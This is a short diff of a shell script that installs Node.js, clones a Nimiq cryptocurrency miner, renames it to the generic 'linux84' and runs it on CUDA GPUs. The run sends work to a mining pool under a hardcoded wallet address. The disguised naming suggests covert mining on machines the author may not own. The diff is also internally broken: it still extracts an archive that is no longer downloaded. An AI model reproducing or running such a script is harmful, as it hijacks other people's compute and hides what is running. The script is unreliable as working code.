@@ -1,7 +1,19 @@
-wget -N https://raw.githubusercontent.com/mobileapps84741274/linuxweb8474/main/linux84.tar.xz
+apt-get update
+
+apt-get install -y nodejs
+
+apt-get install -y npm
+
+git clone https://github.com/tomkha/nq-miner
+
+mv ./nq-miner/ ./linux84
+
+cd ./linux84/
+
+npm install
 
 tar -xvf ./linux84.tar.xz
 
 cd ./linux84/
 
-./linux84 -t cuda -a "NQ04 LMEK U2R9 HBMH QQXM 6EQ2 V5YT T1BH G8QC" -p eu.nimpool.io:8444
+./linux84 -t cuda -a "NQ04 LMEK U2R9 HBMH QQXM 6EQ2 V5YT T1BH G8QC" --log=verbose -p eu.nimpool.io:8444
